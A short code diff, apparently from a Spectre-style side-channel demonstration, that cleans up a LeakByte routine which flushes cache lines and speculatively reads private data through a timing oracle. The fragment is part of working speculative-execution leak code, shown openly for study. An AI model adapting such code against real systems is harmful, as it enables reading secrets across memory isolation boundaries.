@@ -128,13 +128,13 @@ static char LeakByte(size_t offset) {
       // hypothetically on multiple cache-lines.
       const char *accessor_bytes = reinterpret_cast<const char*>(accessor);
       for (size_t j = 0; j < object_size_in_bytes; j += kCacheLineSize) {
-        CLFlush(accessor + j);
+        CLFlush(accessor_bytes + j);
       }
 
       // Speculative fetch at the offset. Architecturally it fetches
       // always from the public_data, though speculatively it fetches the
       // private_data when i is at the local_pointer_index.
-      ForceRead(&isolated_oracle[(size_t)(
+      ForceRead(&isolated_oracle[static_cast<size_t>(
           accessor->GetDataByte(offset, read_private_data))]);
     }
 
@@ -151,7 +151,7 @@ static char LeakByte(size_t offset) {
   }
 }
 
-int main(int argc, char **argv) {
+int main() {
   std::cout << "Leaking the string: ";
   std::cout.flush();
   for (size_t i = 0; i < strlen(public_data); ++i) {
